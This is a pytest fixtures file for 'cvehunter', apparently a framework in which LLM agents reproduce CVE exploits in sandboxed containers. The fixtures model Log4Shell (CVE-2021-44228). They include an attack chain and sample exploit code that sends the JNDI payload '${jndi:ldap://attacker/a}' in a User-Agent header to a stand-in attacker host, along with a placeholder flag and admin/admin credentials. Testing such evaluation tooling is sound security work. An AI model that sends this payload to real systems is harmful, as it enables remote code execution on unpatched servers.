"""Shared pytest fixtures for the cvehunter test suite."""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from cvehunter.schemas import (
    CVEPackage,
    EnvironmentSpec,
    ExploitAttempt,
    ExploitRecipe,
    ExploitResult,
    HITLLevel,
    JudgementReport,
    Primitive,
    PrimitivesGraph,
)


@pytest.fixture
def sample_cve_package() -> CVEPackage:
    return CVEPackage(
        cve_id="CVE-2021-44228",
        description=(
            "Apache Log4j2 JNDI features do not protect against attacker "
            "controlled LDAP and other JNDI related endpoints."
        ),
        cvss_score=10.0,
        cwe_id="CWE-917",
        affected_software="Apache Log4j",
        affected_versions=["2.0-beta9", "2.14.1"],
        language="java",
        framework="Log4j",
        patch_diff=(
            "--- a/log4j-core/src/main/java/...\n"
            "+++ b/log4j-core/src/main/java/..."
        ),
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        repo_url="https://github.com/apache/logging-log4j2",
        patch_commit="abc123",
    )


@pytest.fixture
def sample_exploit_recipe() -> ExploitRecipe:
    jndi_lookup = Primitive(
        id="jndi_lookup",
        name="JNDI Lookup Injection",
        description="Inject a malicious JNDI lookup string via user input",
        confidence=0.95,
        evidence="Patch removes JndiLookup class",
        prerequisites=[],
    )
    ldap_callback = Primitive(
        id="ldap_callback",
        name="LDAP Callback",
        description="Attacker-controlled LDAP server returns malicious object",
        confidence=0.90,
        evidence="No validation of LDAP response classes",
        prerequisites=["jndi_lookup"],
    )
    rce = Primitive(
        id="rce",
        name="Remote Code Execution",
        description="Deserialized object executes arbitrary code",
        confidence=0.85,
        evidence="ObjectFactory.getObjectInstance used without filtering",
        prerequisites=["ldap_callback"],
    )
    return ExploitRecipe(
        cve_id="CVE-2021-44228",
        vulnerability_type="rce",
        attack_vector="network",
        primitives_graph=PrimitivesGraph(
            nodes={
                "jndi_lookup": jndi_lookup,
                "ldap_callback": ldap_callback,
                "rce": rce,
            },
            edges=[("jndi_lookup", "ldap_callback"), ("ldap_callback", "rce")],
            complete_chains=[["jndi_lookup", "ldap_callback", "rce"]],
        ),
        exploitation_steps=[
            "Send HTTP request with ${jndi:ldap://attacker/a} in User-Agent header",
            "LDAP server responds with reference to malicious Java class",
            "Log4j deserializes the class, triggering code execution",
        ],
        required_conditions=[
            "Log4j 2.0-beta9 to 2.14.1",
            "Application logs user-controlled input",
        ],
        estimated_complexity="low",
    )


@pytest.fixture
def sample_environment_spec() -> EnvironmentSpec:
    return EnvironmentSpec(
        cve_id="CVE-2021-44228",
        vulnerable_image="cvehunter-vuln-log4j:2.14.1",
        patched_image="cvehunter-vuln-log4j:2.17.0",
        compose_yaml=(
            "version: '3.8'\nservices:\n  web:\n    image: cvehunter-vuln-log4j:2.14.1\n"
            "    ports:\n      - '8080:8080'\n"
        ),
        flag_value="CVEHUNTER{deadbeef1234567890abcdef}",
        flag_location="/root/flag.txt",
        network_name="cvehunter-cve_2021_44228_default",
        services=["web"],
        health_check_passed=True,
        patched_network_name="cvehunter-cve_2021_44228-patched_default",
        credentials={"admin": "admin"},
    )


@pytest.fixture
def sample_exploit_result_success() -> ExploitResult:
    return ExploitResult(
        cve_id="CVE-2021-44228",
        success=True,
        attempts=[
            ExploitAttempt(
                attempt_number=1,
                exploit_code='import requests\nrequests.get("http://web:8080", headers={"User-Agent": "${jndi:ldap://attacker/a}"})',
                stdout="FLAG=CVEHUNTER{deadbeef1234567890abcdef}",
                stderr="",
                flag_captured=True,
                captured_value="CVEHUNTER{deadbeef1234567890abcdef}",
                model_tier_used="smart",
            ),
        ],
        final_exploit_code='import requests\nrequests.get("http://web:8080", headers={"User-Agent": "${jndi:ldap://attacker/a}"})',
        flag_captured=True,
        fails_on_patched=True,
        total_attempts=1,
    )


@pytest.fixture
def sample_exploit_result_failure() -> ExploitResult:
    return ExploitResult(
        cve_id="CVE-2021-44228",
        success=False,
        attempts=[
            ExploitAttempt(
                attempt_number=i,
                exploit_code=f"# attempt {i}",
                stdout="",
                stderr="Connection refused",
                flag_captured=False,
                error_analysis="Target not reachable",
                model_tier_used="smart" if i <= 10 else "heavy",
            )
            for i in range(1, 16)
        ],
        final_exploit_code="",
        flag_captured=False,
        fails_on_patched=False,
        total_attempts=15,
    )


@pytest.fixture
def sample_judgement_report() -> JudgementReport:
    return JudgementReport(
        cve_id="CVE-2021-44228",
        exploitability_score=9.5,
        exploit_genuine=True,
        environment_realistic=True,
        no_external_pocs_used=True,
        hitl_level=HITLLevel.NONE,
        shortcut_detected=False,
        summary="Exploit is genuine and fully autonomous.",
        full_analysis="The exploit correctly targets the Log4Shell JNDI injection...",
    )


def _make_ai_message(
    content: str = "",
    tool_calls: list[dict[str, Any]] | None = None,
    input_tokens: int = 100,
    output_tokens: int = 50,
) -> MagicMock:
    """Build a mock AIMessage with optional tool_calls and usage_metadata."""
    msg = MagicMock()
    msg.content = content
    msg.tool_calls = tool_calls or []
    msg.usage_metadata = {
        "input_tokens": input_tokens,
        "output_tokens": output_tokens,
    }
    return msg


@pytest.fixture
def mock_ai_message():
    """Factory fixture: call with optional content/tool_calls/tokens."""
    return _make_ai_message


@pytest.fixture
def mock_structured_llm():
    """Factory: returns a mock LLM whose .ainvoke() returns the given Pydantic model."""

    def _factory(return_value: Any) -> MagicMock:
        mock_llm = MagicMock()
        mock_structured = MagicMock()
        mock_structured.ainvoke = AsyncMock(return_value=return_value)
        mock_llm.with_structured_output = MagicMock(return_value=mock_structured)
        mock_llm.ainvoke = AsyncMock(return_value=_make_ai_message())
        mock_llm.bind_tools = MagicMock(return_value=mock_llm)
        return mock_llm

    return _factory
